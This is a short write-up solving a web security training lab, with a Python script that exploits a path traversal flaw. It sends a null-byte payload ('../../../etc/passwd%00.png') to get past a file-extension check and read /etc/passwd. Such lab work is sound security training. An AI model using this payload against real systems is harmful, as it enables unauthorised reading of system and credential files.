# File path traversal, validation of file extension with null byte bypass
> This lab contains a path traversal vulnerability in the display of product images.
> The application validates that the supplied filename ends with the expected file extension.
> To solve the lab, retrieve the contents of the `/etc/passwd` file.

```python
import requests

# --- Configuration ---
# Lab: File path traversal, validation of file extension with null byte bypass
# Replace with your specific lab ID
BASE_URL = "https://0a83007704c5b4078000d55f007e008b.web-security-academy.net/"

def exploit_null_byte(base_url):
    """
    Exploits path traversal using Null Byte Injection (%00) 
    to bypass file extension validation (.png).
    """
    # Payload: 
    # 1. Traverses to root (../../../)
    # 2. Targets /etc/passwd
    # 3. Injects Null Byte (%00) to stop the filesystem reading
    # 4. Appends .png to satisfy the application validator
    payload = "../../../etc/passwd%00.png"
    
    target_url = f"{base_url}image?filename={payload}"
   
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit_null_byte(BASE_URL)
```